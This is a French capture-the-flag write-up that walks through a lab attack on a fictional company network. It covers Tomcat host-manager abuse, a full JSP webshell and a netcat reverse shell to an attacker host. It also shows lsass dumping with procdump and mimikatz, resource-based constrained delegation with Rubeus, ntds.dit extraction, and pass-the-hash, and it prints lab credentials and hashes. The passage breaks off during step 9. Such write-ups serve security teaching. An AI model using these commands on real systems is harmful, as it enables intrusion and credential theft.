2019-07-05 13:15:32    1140644 MachineAccountQuota is USEFUL Sometimes_ Exploiting One of Active Directory\'s Oddest Settings.pdf
2019-07-05 13:15:45    1726183 Preventing Mimikatz Attacks – Blue Team – Medium.pdf
                                
➜ aws s3 cp s3://willywonka-shop/Flag-04.txt .
download: s3://willywonka-shop/Flag-04.txt to ./Flag-04.txt 

➜ aws s3 cp s3://willywonka-shop/tools/vpn/wonka_internal.ovpn .
download: s3://willywonka-shop/tools/vpn/wonka_internal.ovpn to ./wonka_internal.ovpn

➜ cat Flag-04.txt 
0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
```

On récupère un fichier vpn, enfin ! Mais on récupère aussi un schéma réseau :

![](/img/writeups/wonkachall2019/infra.png)

### Flag

> 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528

---

### Resources

1. __@christophetd__, _Abusing the AWS metadata service using SSRF vulnerabilities_, Blog de Christophe Tafani-Dereeper : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
2. __notsosecure team__, _Exploiting SSRF in AWS Elastic Beanstalk_, notsosecure : https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/

## Step 5 - Tom and Jerry

>  Lets get the flag at the root of your first blood 

![](https://media.giphy.com/media/s87EAEfMJDulq/giphy.gif)

### TL;DR

1. Se connecter au VPN récupéré dans le bucket
2. Voir qu'il y a une nouvelle route qui est apparue : `172.16.42.0/24`
3. Enumération du réseau interne et voir une machine avec le port 8080 (tomcat)
4. Après un `dirsearch` avec une wordlist spécial tomcat (seclist), on trouve la page `/host-manager/`
5. Se connecter avec les creds `tomcat : tomcat`
6. Monter un partage `data` avec un webshell (`cmd.war`) à l'intérieur
7. Déployer ce nouvel host via les `UNC path`
8. Accéder au webshell à l'adresse : `http://maki-lab:8080/cmd/index.jsp?cmd=whoami`
7. Faire un reverse shell et récupérer le flag

---

### Network recon

Un fichier OpenVPN ! Enfin de l'interne ! Lorsque le tunnel VPN est monté, une nouvelle route apparait :

```bash
➜  ip r | grep tun0
10.8.0.1 via 10.8.0.17 dev tun0 
10.8.0.17 dev tun0 proto kernel scope link src 10.8.0.18 
172.16.42.0/24 via 10.8.0.17 dev tun0 
```

Maintenant il est temps de scanner le sous réseau : `172.16.42.0/24`

```bash
sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 1000 172.16.42.0/24

Discovered open port 445/tcp on 172.16.42.5                                    
Discovered open port 53/tcp on 172.16.42.5                                     
Discovered open port 445/tcp on 172.16.42.101                                  
Discovered open port 445/tcp on 172.16.42.11                                   
```

Je n'ai pas spécialement confiance au ping scan de nmap, car si l'icmp est bloqué et qu'il n'y a pas de service sur le port 80 et 443, alors l'hôte sera vu comment down. D'où le masscan sur des ports un peu connus. Cette technique révèle 3 IP :

* 172.16.42.5
* 172.16.42.11
* 172.16.42.101

C'est le moment pour un port scan. J'ai tendance à d'abord faire un masscan (beaucoup plus rapide que nmap) suivi d'un nmap sur les ports ouverts pour avoir les infos des services exposés.

#### 172.16.42.5

```bash
sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.5 | tee out_mass_5

Discovered open port 49669/tcp on 172.16.42.5                                  
Discovered open port 445/tcp on 172.16.42.5                                    
Discovered open port 53/udp on 172.16.42.5                                     
Discovered open port 53/tcp on 172.16.42.5                                     
Discovered open port 3268/tcp on 172.16.42.5                                   
Discovered open port 50206/tcp on 172.16.42.5                                  
Discovered open port 593/tcp on 172.16.42.5                                    
Discovered open port 636/tcp on 172.16.42.5                                    
Discovered open port 49687/tcp on 172.16.42.5       

cat out_mass_5 | cut -d ' ' -f4 | sed 's/\/.*$//' | tr '\n' ','
49669,445,53,53,3268,50206,593,636,49687

sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p49669,445,53,53,3268,50206,593,636,49687 172.16.42.5

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS
445/tcp   open  microsoft-ds? syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: factory.lan0., Site: Default-First-Site-Name)
49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack Microsoft Windows RPC
50206/tcp open  msrpc         syn-ack Microsoft Windows RPC

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40427/tcp): CLEAN (Timeout)
|   Check 2 (port 46791/tcp): CLEAN (Timeout)
|   Check 3 (port 49455/udp): CLEAN (Timeout)
|   Check 4 (port 14211/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-07-11 13:39:58
|_  start_date: 1601-01-01 00:09:21
```

#### 172.16.42.11


```bash
sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.11

Discovered open port 8080/tcp on 172.16.42.11          
Discovered open port 445/tcp on 172.16.42.11     

sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p8080,445 172.16.42.11

PORT     STATE SERVICE       REASON  VERSION
445/tcp  open  microsoft-ds? syn-ack
8080/tcp open  http-proxy    syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
[...]
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Willy Wonka Wiki

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30938/tcp): CLEAN (Timeout)
|   Check 2 (port 43825/tcp): CLEAN (Timeout)
|   Check 3 (port 45891/udp): CLEAN (Timeout)
|   Check 4 (port 33171/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-07-11 13:43:52
|_  start_date: 1601-01-01 00:09:21
```

#### 172.16.42.101

```bash
sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.101

Discovered open port 135/tcp on 172.16.42.101                                  
Discovered open port 49712/tcp on 172.16.42.101                                
Discovered open port 445/tcp on 172.16.42.101                                  
Discovered open port 5040/tcp on 172.16.42.101                                 
Discovered open port 49669/tcp on 172.16.42.101                  

sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p135,49712,445,5040,49669 172.16.42.101

PORT      STATE    SERVICE REASON      VERSION
135/tcp   open     msrpc   syn-ack     Microsoft Windows RPC
554/tcp   filtered rtsp    no-response
5040/tcp  open     unknown syn-ack
49669/tcp open     msrpc   syn-ack     Microsoft Windows RPC
49712/tcp open     msrpc   syn-ack     Microsoft Windows RPC
```

A vu de nez je dirais que la machine en .5 est un domain controller, donc on verra plus tard pour taper dessus. Ensuite les connexions anonymes SMB et RPC n'ont rien données.

J'ai donc décidé de me tourner vers la machine .11, car il y a le port 8080 qui ressemble à un tomcat.

### Basic enum on 172.16.42.11

J'ai fait un dirsearch avec une wordlist pour tomcat : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt

```bash
python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e .jsp,.html,.do,.action,.txt -w ./tomcat.txt    

[15:08:17] 302 -    0B  - /host-manager  ->  /host-manager/
[15:08:17] 401 -    2KB - /host-manager/html/%2A
[15:08:17] 302 -    0B  - /manager  ->  /manager/
```

C'est à ce moment que j'ai compris que les gens travaillant chez Akerva sont des petits coquins. Par défaut, quand je tombe sur un tomcat, je vais directement sur la page `/manager` :

![](/img/writeups/wonkachall2019/step5_manager.png)
_Fig 13_ : Manager page

Mais il y a une autre page : `/host-manager`, une basic authent apparait et il suffit de tester les identifiants par défaut de tomcat :

> tomcat : tomcat

En cherchant un peu sur internet, je suis tombé sur un article de Certilience (cf. Ressource 1), il suffit de suivre.

### Setup the attack

Il faut d'abord crafter le .war qui va nous permettre d'avoir un webshell. J'ai généré une archive war avec msfvenom puis modifié la charge pour avoir un webshell standard plutôt qu'un meterpreter. 

Il faut savoir qu'une application war est en fait une archive zip, donc il suffit de décompresser l'archive générée avec msfvenom, remplacer le fichier jsp et le web.xml et compresser à nouveau le tout.

On se retrouve avec l'archive suivante :

```bash
➜ tree .                   
.
├── index.jsp
├── META-INF
│   └── MANIFEST.MF
└── WEB-INF
    └── web.xml
```

et le index.jsp contient :

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Ce webshell vient de : https://github.com/tennc/webshell

Le .war peut être téléchargé ici : https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs

#### New host 

Maintenant, il faut ajouter une entrée dans le `/etc/hosts` pour lier l'ip du web server à un hostname :

```bash
sudo echo "172.16.42.11	maki-lab" >> /etc/hosts
```

#### SMB server

Enfin, mettre en place un serveur Samba, impacket fait largement l'affaire :

```bash
sudo smbserver.py -smb2support data .
```

Le serveur samba se place dans le dossier courant, il faut pas non plus oublier de mettre notre archive war dans ce dossier pour la déployer.

### Exploitation

Aller, maintenant il est temps de déployer notre webshell

![](/img/writeups/wonkachall2019/step5_hostmanager.png)
_Fig 14_ : Host-manager page

Lors du déploiement on voit de l'activité au niveau du serveur SMB. Une fois que cette nouvelle application est déployé, on peut y accéder avec l'url suivante :

> http://maki-lab:8080/cmd/index.jsp

![](/img/writeups/wonkachall2019/step5_webshell.png)
_Fig 15_ : Webshell

Maintenant il est temps d'avoir un vrai shell. Pour cela il suffit de mettre un netcat dans notre share et l'éxecuter via les UNC path. Mais avant, il faut connaitre la configuration du serveur :

![](/img/writeups/wonkachall2019/step5_systeminfo.png)
_Fig 16_ : Systeminfo

On voit bien que c'est du 64 bits, donc c'est le moment de faire notre reverse shell :

```bash
rlwrap ncat -klvp 12345
```

Le `rlwrap` sert à utiliser les flèches dans le terminal. Pour déclencher ce reverse shell, je n'ai plus qu'à faire :

```bash
\\10.8.0.10\data\nc64.exe -e cmd.exe 10.8.0.10 12345
```

![](/img/writeups/wonkachall2019/step5_reverseshell.png)
_Fig 17_ : Reverse shell

Maintenant qu'on a un shell plus ou moins interactif et plus ou moins stable, il est temps de récupérer le flag!

![](/img/writeups/wonkachall2019/step5_flag.png)
_Fig 18_ : Flag

### Flag

> 8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8

---

### Resources

1. __Pôle audit de Certilience__, _Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?_, Blog de Certilience : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/

## Step 6 - Mimikatz you said ?

>  SHA256(adminServer's passwd) 

![](https://media.giphy.com/media/r68EdGg3KOSpG/giphy.gif)

### TL;DR

1. Exécuter `procdump.exe` sur le serveur avec le tomcat
2. Récupérer le minidump de `lsass.exe`
3. Récupérer les identifiants stocké dedans avec `mimikatz` en local
4. Trouver le mot de passe de `adminserver` : `factory.lan\adminServer : #3LLe!!estOuL@Poulette`

---

### State of the art

Dans ce challenge, la première idée qui vient est d'utiliser mimikatz. Mais bon, ça aurait été trop simple.

L'autre solution pour récupérer des creds dans lsass, est de créer un minidump et de l'analyser avec un mimikatz en local. De toute manière on va avoir besoin d'une machine Windows à un moment donné. Pour ma part, j'utilise Commando VM, c'est un script powershell fait par FireEye pour installer les outils classiques de pentest. Plutot pratique.

### Getting lsass minidump

Comme je disais précédemment, on va utiliser procdump. C'est un binaire signé et trusté par Microsoft, car il fait parti des SysInternals. J'ai tendance à ne pas vouloir drop des binaires ou modifier la configuration d'une machine cible, donc je préfère l'éxecution en mémoire :

```bash
\\10.8.0.10\data\procdump64.exe -ma lsass.exe lsadump
```

![](/img/writeups/wonkachall2019/step6_procdump.png)
_Fig 19_ : Getting lsass minidump with procdump

Et donc maintenant, histoire de récupérer ce minidump, on peut utiliser Samba à nouveau :

```bash
copy lsadump.dmp \\10.8.0.10\data\lsadump.dmp
```

![](/img/writeups/wonkachall2019/step6_smbtransfer.png)
_Fig 20_ : Bring back the minidump at home

Le minidump est disponible ici : https://mega.nz/#!bj4h1ISB!17pQuX17K8gvMRlBZYsuphDtHhYE07G1x-nyT1OPGVY

### Getting password

En executant mimikatz dans Commando VM :

```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::Minidump lsassdump.dmp
Switch to MINIDUMP : 'lsassdump.dmp'

mimikatz # sekurlsa::logonPasswords
Opening : 'lsassdump.dmp' file for minidump...

[...]
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SRV01-INTRANET$
Domain            : FACTORY
Logon Server      : (null)
Logon Time        : 05/07/2019 12:16:10
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SRV01-INTRANET$
         * Domain   : FACTORY
         * Password : (null)
        kerberos :
         * Username : srv01-intranet$
         * Domain   : FACTORY.LAN
         * Password : (null)
        ssp :
        credman :
         [00000000]
         * Username : factory.lan\adminServer
         * Domain   : 172.16.42.101
         * Password : #3LLe!!estOuL@Poulette
```

J'ai tronqué un peu la sortie, sinon c'est chiant à lire. On a donc récupérer les identifiants suivants :

> factory.lan\adminServer : #3LLe!!estOuL@Poulette

Et maintenant il suffit d'en faire le sha256 pour avoir la flag.

### Flag

> 87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4

---

### Resources

1. __Sebastien Macke - @lanjelot__, _Dumping Windows Credentials_, securusglobal : https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
2. __cyberarms__, _Grabbing Passwords from Memory using Procdump and Mimikatz_, cyberarms : https://cyberarms.wordpress.com/2015/03/16/grabbing-passwords-from-memory-using-procdump-and-mimikatz/
3. __ired.team__, _Credential Access & Dumping_, ired.team : https://ired.team/offensive-security/credential-access-and-credential-dumping
4. __Mark Russinovich and Andrew Richards__, _ProcDump v9.0_,  Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/downloads/procdump

## Step 7 - Spreading love

>  Sharing is caring ;) 

![](https://media.giphy.com/media/l2R06ThAkEohO3DHi/giphy.gif)

### TL;DR

1. Avec les identifiants récupérer, il suffit de voir à quels shares nous avons accès
2. Trouver le shares `Users` sur le serveur `172.16.42.5`
3. Le monter en local et récupérer le flag et d'autres identifiants : `factory.lan\SvcJoinComputerToDom : QueStC3qU!esTpetItEtMarr0N?`

---

### State of the art

Maintenant il faut se rappeler les différents scans qu'on a fait jusqu'à présent. Le potentiel DC est le `172.16.42.5`, voyons s'il est possible de se connecter à un share :

```bash
➜ cme smb 172.16.42.5 -u 'adminServer' -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' --shares
SMB         172.16.42.5     445    DC01-WW2         [*] Windows 10.0 Build 17763 x64 (name:DC01-WW2) (domain:factory.lan) (signing:True) (SMBv1:False)
SMB         172.16.42.5     445    DC01-WW2         [+] factory.lan\adminServer:#3LLe!!estOuL@Poulette 
SMB         172.16.42.5     445    DC01-WW2         [+] Enumerated shares
SMB         172.16.42.5     445    DC01-WW2         Share           Permissions     Remark
SMB         172.16.42.5     445    DC01-WW2         -----           -----------     ------
SMB         172.16.42.5     445    DC01-WW2         ADMIN$                          Remote Admin
SMB         172.16.42.5     445    DC01-WW2         C$                              Default share
SMB         172.16.42.5     445    DC01-WW2         IPC$            READ            Remote IPC
SMB         172.16.42.5     445    DC01-WW2         NETLOGON        READ            Logon server share 
SMB         172.16.42.5     445    DC01-WW2         provisioning    READ            
SMB         172.16.42.5     445    DC01-WW2         SYSVOL          READ            Logon server share 
SMB         172.16.42.5     445    DC01-WW2         Users           READ    
```

Il y a le share "Users" ! C'est super intéressant ! 

### Mount Users share

Il ne reste plus qu'à monter le volume distant.

```bash
➜ mkdir /tmp/a

➜ sudo mount -t cifs -o username=adminServer,password='#3LLe!!estOuL@Poulette' //172.16.42.5/Users a

➜ ls /tmp/a
Administrator   Default   desktop.ini

➜  a tree Administrator 
Administrator
└── Documents
    └── provisioning
        ├── credentials.txt
        └── flag-07.txt
```

### Flag

> 5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C

---

### Resources

1. __ShawnDEvans__, _SMBmap_, GitHub : https://github.com/ShawnDEvans/smbmap
2. __Mickael Dorigny__, _Monter un partage CIFS sous Linux_, it-connect : https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/

## Step 8 - Wagging the dogs

>  SHA256(NTLM(krbtgt)) 

![](https://media.giphy.com/media/3orif3kYWn0jg3JiWA/giphy.gif)

### TL;DR

1. Connecter une machine au Domaine (j'ai pris une commando VM)
2. Faire un `bloodhound` de l'active directory
3. Grâce à la note de l'étape précédente et les comptes qu'on a, on se doute que c'est du `resources based constrained delegation`
4. Ajouter une machine au domaine avec un `SPN` connu
5. Modifier la valeur de `msDS-AllowedToActOnBehalfOfOtherIdentity` de cet utilisateur
6. Utiliser `S4U2User` et `S4U2Proxy` avec Rubeus pour impersonate Administrator sur le Domain Controller
7. Rubeus forge un ticket, il suffit de faire un `psexec` sur le DC avec l'utilisateur impersonate (Administrator)
8. Récupérer le `ntds.dit` grâce à l'outil `vssadmin`
9. récupérer le hash de `krbtgt`

---

### State of the art

Cette étape a été pour moi la plus compliquée du challenge, j'y ai passé vraiment plusieurs heures dessus. Pour réussir correctement cette étape il faut partir de la note récupéré dans l'épreuve précédente :

```bash
#####
## Provisioning Account
####

This account is used only for joining machines (servers & workstations) to domain.
We created it to "delegate" this right to servers and workstations admins since we have disabled
this right for regular users and we do not want to give domain admin rights to
servers administrators and workstation administrators.

factory.lan\SvcJoinComputerToDom
QueStC3qU!esTpetItEtMarr0N?
```

Il faut prendre en compte toutes les informations. La note ci-dessus parle de `delegate`, donc probablement une histoire de délégation, dans un AD il y a plusieurs type de délégation, le blog de Pixis en parle très bien :

* Fonctionnement de la délégation kerberos : https://beta.hackndo.com/constrained-unconstrained-delegation/
* Resources based constrained delegation : https://beta.hackndo.com/resource-based-constrained-delegation-attack/
* Unconstrained delegation : https://beta.hackndo.com/unconstrained-delegation-attack/

#### Connection to Active Directory

Maintenant qu'on a un compte pouvant se connecter au domaine, j'ai décidé d'ajouter ma Commando VM à l'active directory. Pour ça, j'ai mis ma VM en NAT et je me suis connecté au VPN avec mon hôte, comme ça même les redémarrages de la VM ne vont pas être dérangeant pour se connecter à l'AD.

Pour les DNS de Commando VM j'ai mis :

* 172.16.42.5 : adresse de l'active directory, pour utiliser son DNS
* 192.168.143.1 : adresse de mon hôte pour taper dessus si besoin

![](/img/writeups/wonkachall2019/step8_dns.png)
_Fig 21_ : DNS IP

Pour connecter la VM à l'AD, il suffit de le faire avec les utilitaires graphiques de Windows 10 : `Se connecter à réseau scolaire ou professionnel`, avec les identifiants du compte `SvcJoinComputerToDom`.

![](/img/writeups/wonkachall2019/step8_connect2dom.png)
_Fig 22_ : Connection to domain

En type de compte, j'ai mis `Administrateur`, ça fait de `SvcJoinComputerToDom` un administrateur local. On en aura besoin plus tard. Pour s'assurer que notre compte est bien relié au domaine, il nous suffit de lister les utilisateurs avec `net user /dom` :

![](/img/writeups/wonkachall2019/step8_domainuser.png)
_Fig 23_ : Test if the machine is in the domain

#### Bloodhound

Bloodhound est un outil de mapping Active Directory, je vais le lancer histoire de voir un peu les différentes relations entre les entités (machines, utilisateurs...) et essayer de récupérer des éléments sur les délégations. Voici la liste des domain admin :

![](/img/writeups/wonkachall2019/step8_domainadmin.png)
_Fig 24_ : Domain admin account

Le but va être d'impersonate l'utilisateur `Administrator`.

Le Bloodhound est disponible ici : https://mega.nz/#!2rwTFK4I!YMUyIKpmGUvH4uqr2DSjyGCpqEBEFqz8zG09NMJLgxg

#### Which type of delegation ?

Avec les éléments récupérés, on a un compte pouvant ajouter une machine à un domaine, donc on s'affranchi de la phase du man in the middle ipv6 expliqué dans l'article de Pixis. En sachant ça, on peut ajouter une machine au domaine, créer et ajouter un SPN au domaine. On peut donc dire que ça ressemble à la `Resource Based Constrained Delegation`.

Alors si j'ai bien compris cette histoire de resources based constrained delegation, il faut que j'ajoute une machine au domaine, une machine où je suis administrateur local. Ensuite, créer un compte SPN et l'ajouter au domaine. Une fois qu'on a une machine et un compte SPN, grâce à l'utilisateur `SvcJoinComputerToDom`, il faut modifier la variable `msds-allowedtoactonbehalfofotheridentity` pour que la ressource finale soit "de confiance". Une fois que tous ça est en place, il faut faire une requête `S4U2Self` pour récupérer un TGS non transférable et utiliser `S4U2Proxy` pour quand même accéder à la ressource voulu en tant que n'importe quel utilisateur, soit l'accès au DC en tant qu'Administrator.

### Resource Based Constrained Delegation

Après un peu de recherche, on tombe carrément sur un ps1 exploitant le RBCD, script réalisé par harmj0y : https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff

Pour réussir correctement cette exploitation, nous avons besoin des deux scripts suivants :

* PowerView : https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
* PowerMad : https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1

#### Verify right on AD

```bash
Import-Module .\powermad.ps1
Import-Module .\powerview.ps1
$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
$ACE
```

![](/img/writeups/wonkachall2019/step8_propertywrite.png)
_Fig 25_ : WriteProperty in the AD

On a bien les droits d'écriture. On va en avoir besoin pour modifier la variable `msds-allowedtoactonbehalfofotheridentity`.

```bash
ConvertFrom-SID $ACE.SecurityIdentifier

FACTORY\SvcJoinComputerToDom
FACTORY\SvcJoinComputerToDom
```

#### Adding machine to domain

Pour que l'attaque fonctionne il faut un compte avec un SPN, si on en a pas on peut en ajouter un grâce au MachineAccountQuota (par défaut on peut ajouter 10 machines dans le domaine).

Il existe New-MachineAccount dans powermad :

```bash
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
```

#### Setting msDS-AllowedToActOnBehalfOfOtherIdentity 

On va juste set le tableau pour un compte et changer le sid avec notre machine qui contient un SPN :

```bash
$ComputerSid = Get-DomainComputer bitedepoulet -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
```

![](/img/writeups/wonkachall2019/step8_acequalifier.png)
_Fig 26_ : AccessAllowed

Maintenant que tout est en place, il faut faire la tambouille avec le S4U.

#### S4U2Self / S4U2Proxy

Pour réussir à impersonate `Administrator`, je vais utiliser Rubeus, et là on a une super erreur :

![](/img/writeups/wonkachall2019/step8_kerberos_issue.png)
_Fig 27_ : Kerberos error

Pour fixer cette erreur, il suffit de synchroniser l'heure de la machine client avec le DC, pour ça il y a la commande `net user /domain /set` :

![](/img/writeups/wonkachall2019/step8_issue_done.png)
_Fig 28_ : Error fixed

Une fois la commande Rubeus terminée, un ticket `Administrator @ factory.lan` est en mémoire :

![](/img/writeups/wonkachall2019/step8_rubeus_ticket.png)
_Fig 29_ : Administrator ticket

Et grâce à ce ticket, on peut accéder au disque du DC :

![](/img/writeups/wonkachall2019/step8_dir_allowed_on_dc.png)
_Fig 30_ : Disque C du DC

### Get NTDS.dit

Maintenant qu'on a impersonate l'utilisateur Administrator, il est possible de se connecter au Domain Controller via psexec. Maintenant dans la pratique, c'est un peu capricieux... Mais bon, il suffit d'une fois et de récupérer le ntds.dit !

```bash
PsExec.exe \\dc01-ww2.factory.lan cmd.exe
```

Une fois connecté, on va utiliser l'utilitaire `vssadmin` pour récupérer le `ntds.dit` :

```bash
vssadmin create shadow /for=C:
```

![](/img/writeups/wonkachall2019/step8_vssadmin.png)
_Fig 31_ : Using vssadmin to extract ntds.dit

Une fois que le ntds.dit a été récupéré, il me faut aussi la base `system` pour lire les différents hashs :

```bash
reg.exe save hklm\system c:\windows\temp\system.save
```

![](/img/writeups/wonkachall2019/step8_dumpsystem.png)
_Fig 32_ : Extracting system base

### Get hashes

Maintenant, il ne reste plus qu'à rappatrier tous ça à la maison et utiliser `secretsdump.py` :

```bash
secretsdump.py -system .\system.save -ntds .\ntds.dit LOCAL
```

![](/img/writeups/wonkachall2019/step8_ntdsextaction_krbtgt.png)
_Fig 32_ : Extracting hash

Enfin ! Il ne reste plus qu'à faire le sha256 du hash de krbtgt pour flag !

### Flag

> 24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5

---

### Resources

1. __PenTestPartners__, _Bloodhound walkthrough. A Tool for Many Tradecrafts_, Blog de PenTestPartners : https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/
1. __Pixis__, _Resource-Based Constrained Delegation - Risques_, hackndo : https://beta.hackndo.com/resource-based-constrained-delegation-attack/
2. __harmj0y__, _A Case Study in Wagging the Dog: Computer Takeover_, Blog de harmj0y : https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
3. __Elad Shamir__, _Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory_, Blog de shenaniganslabs : https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
4. __Dirk-jan Mollema__, _“Relaying” Kerberos - Having fun with unconstrained delegation_, Blog de Dirk-jan Mollema : https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
5. __swisskyrepo__, _PayloadsAllTheThings_, GitHub : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit

## Step 9 - Not so hashed

>  Veruca's home 

![](https://media.giphy.com/media/GIgGwpcmV0VjO/giphy.gif)

### TL;DR

1. Le psexec étant un peu capricieux, il est possible de Pass the hash avec `adminWorkstation`
2. Voir que la machine utilise `winscp`
3. Après quelques recherches sur internet, il est possible de récupérer des infos de WinSCP dans les registres
4. Récupérer le hash réversible de `veruca` dans les registres : `HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78`
5. Récupérer les identifiants : `veruca : CuiiiiYEE3r3!`
6. Ajouter une route vers le sous réseau de la machine de veruca
7. S'y connecter en SSH

---

### State of the art

Avec le hash de krbtgt en notre possession, on peut faire un golden ticket. Ca évitera de nous farcir toute la tambouille avec Rubeus à chaque fois. Cependant, maintenant qu'on a les hash de tout le monde, un pass the hash devrait aussi faire l'affaire.
Il reste une machine qu'on a pas tapé encore : `172.16.42.101`

### Pass the hash

Bon, j'ai une technique pas très élégante, mais j'en avais marre de jouer à la roulette russe avec le psexec. J'ai donc bruteforce les pass the hash pour voir lequel arrive à se connecter. Ca n'a pas été bien long puisque j'ai commencé avec les utilisateurs ayant "admin" dans le nom :

```bash
➜ cat ntds_clear|grep -i 'admin' | grep ':::' 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7fc0c9c128598429119dbc01f450a603:::
adminWorkstation:1103:aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d:::
adminServer:1104:aad3b435b51404eeaad3b435b51404ee:e0ae639c0ee92b2118a1081376c940a0:::
```

Et finalement `adminWorkstation` a fonctionné comme un charme :

```bash
cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY'
```

![](/img/writeups/wonkachall2019/step9_pth.png)
_Fig 32_ : Pass the hash works !

### Veruca's password

On commence avec un demi shell via wmiexec :

```bash
/usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
```

Du coup on sait qu'il y a un utilisateur `adminWorkstation`, c'est parti pour fouiller dans ses fichiers. Il n'y a rien, enfin il n'y a pas de photos / vidéos ou fichiers particulier. Par contre, on a un lnk intéressant :

```bash
C:\Users\adminWorkstation>dir /a Desktop
 Volume in drive C has no label.
 Volume Serial Number is F660-81CF

 Directory of C:\Users\adminWorkstation\Desktop

07/05/2019  03:00 PM    <DIR>          .
07/05/2019  03:00 PM    <DIR>          ..
06/20/2019  12:31 PM               282 desktop.ini
